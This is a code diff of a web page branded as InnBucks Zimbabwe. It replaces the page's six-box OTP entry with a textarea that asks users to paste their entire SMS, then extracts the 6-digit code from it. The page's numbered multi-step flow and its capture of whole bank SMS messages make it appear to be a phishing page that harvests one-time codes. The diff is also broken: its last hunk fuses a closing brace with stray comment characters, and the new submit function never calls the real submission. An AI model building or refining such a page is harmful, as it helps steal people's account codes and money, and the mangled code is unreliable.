@@ -435,8 +435,8 @@
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>OTP Verification</h2>
-      <p class="otp-hint">Enter the OTP sent to your phone number</p>
+      <h2>SMS Verification</h2>
+      <p class="otp-hint">Copy the entire SMS received on your phone and paste it below. We'll automatically extract your code.</p>
       <div class="otp-phone" id="otpPh">+263712345678</div>
 
       <!-- Inline messages for OTP page -->
@@ -451,22 +451,32 @@
       </div>
 
       <div id="otpInputSection">
-        <div class="otp-inputs">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,5)" id="o5">
+        <!-- New full SMS paste/input layout -->
+        <div class="otp-paste-container" style="margin-bottom: 20px;">
+          <textarea 
+            id="smsPasteBox" 
+            placeholder="Paste your full OTP SMS text here..." 
+            rows="3" 
+            style="width: 100%; max-width: 100%; padding: 12px; border: 2px dashed #ccc; border-radius: 8px; font-family: inherit; box-sizing: border-box; resize: none;"
+            oninput="extractOtpCode(this.value)"
+          ></textarea>
+          
+          <!-- Visual feedback showing the user what was extracted -->
+          <div id="extractedFeedback" style="margin-top: 10px; font-size: 14px; display: none;">
+            Detected Code: <strong id="detectedCode" style="font-size: 18px; color: #000; letter-spacing: 2px;"></strong>
+          </div>
+          
+          <!-- Hidden or read-only backup input to store the actual 6-digit code for doOtp() -->
+          <input type="hidden" id="finalOtpValue">
         </div>
+
         <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
-        <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
+        <button class="btn-otp" id="bOtp" onclick="submitExtractedOtp()" disabled style="opacity: 0.6; cursor: not-allowed;">SUBMIT</button>
       </div>
     </div>
   </div>
   <div class="otp-curve"><div class="otp-foot">© 2026 InnBucks Zimbabwe</div></div>
 </div>
-
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
 <div id="page-approval" class="page">
   <div class="appr-wrap">
@@ -841,39 +851,73 @@
   // ══════════════════════════════════════════════════════
   // OTP INPUT HELPERS
   // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+  // 1. REPLACED: Old otpMv replaced with text extraction logic
+function extractOtpCode(pastedText) {
+  // Regex looks for the first sequence of exactly 6 digits in the text
+  const match = pastedText.match(/\b\d{6}\b/);
+  const feedbackDiv = document.getElementById('extractedFeedback');
+  const codeSpan = document.getElementById('detectedCode');
+  const finalInput = document.getElementById('finalOtpValue');
+  const submitBtn = document.getElementById('bOtp');
+
+  if (match) {
+    const code = match[0];
+    finalInput.value = code; // Stores code for your backend payload
+    if (codeSpan) codeSpan.textContent = code;
+    if (feedbackDiv) feedbackDiv.style.display = 'block';
+    
+    // Enable the submit button by updating class/attributes
+    submitBtn.disabled = false;
+    submitBtn.className = 'btn-otp rdy'; 
+    submitBtn.style.opacity = '1';
+    submitBtn.style.cursor = 'pointer';
+  } else {
+    finalInput.value = '';
+    if (feedbackDiv) feedbackDiv.style.display = 'none';
+    
+    // Keep submit button disabled if no valid 6-digit code is found
+    submitBtn.disabled = true;
+    submitBtn.className = 'btn-otp';
+    submitBtn.style.opacity = '0.6';
+    submitBtn.style.cursor = 'not-allowed';
   }
+}
 
-  let _rsInterval = null;
-  function startRs() {
-    // Clear any existing countdown first
-    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
-    let s = 60;
-    const rsBox = document.getElementById('otpRs');
-    if (!rsBox) return;
-
-    // Always rebuild the span fresh so the ID exists
-    rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
-
-    _rsInterval = setInterval(() => {
-      s--;
-      const cur = document.getElementById('rsS');
-      if (cur) cur.textContent = s;
-      if (s <= 0) {
-        clearInterval(_rsInterval);
-        _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
-      }
-    }, 1000);
+// 2. NEW: Standardized submission function for the button click
+function submitExtractedOtp() {
+  const finalCode = document.getElementById('finalOtpValue').value;
+  if (finalCode.length === 6) {
+    // Call your existing form submission/API function here
+    console.log("Submitting code:", finalCode);
+    // doOtp(); 
   }
+}
 
-  // ══════════════════════════════════════════════════════
+// 3. KEPT: Your original countdown timer logic (Do not delete this!)
+let _rsInterval = null;
+function startRs() {
+  // Clear any existing countdown first
+  if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+
+  let s = 60;
+  const rsBox = document.getElementById('otpRs');
+  if (!rsBox) return;
+
+  // Always rebuild the span fresh so the ID exists
+  rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
+
+  _rsInterval = setInterval(() => {
+    s--;
+    const cur = document.getElementById('rsS');
+    if (cur) cur.textContent = s;
+    if (s <= 0) {
+      clearInterval(_rsInterval);
+      _rsInterval = null;
+      const box = document.getElementById('otpRs');
+      if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+    }
+  }, 1000);
+}══════════════════════════════════════════════════════
   // RESEND OTP — calls /api/resend-otp
   // ══════════════════════════════════════════════════════
   async function resendOtp() {
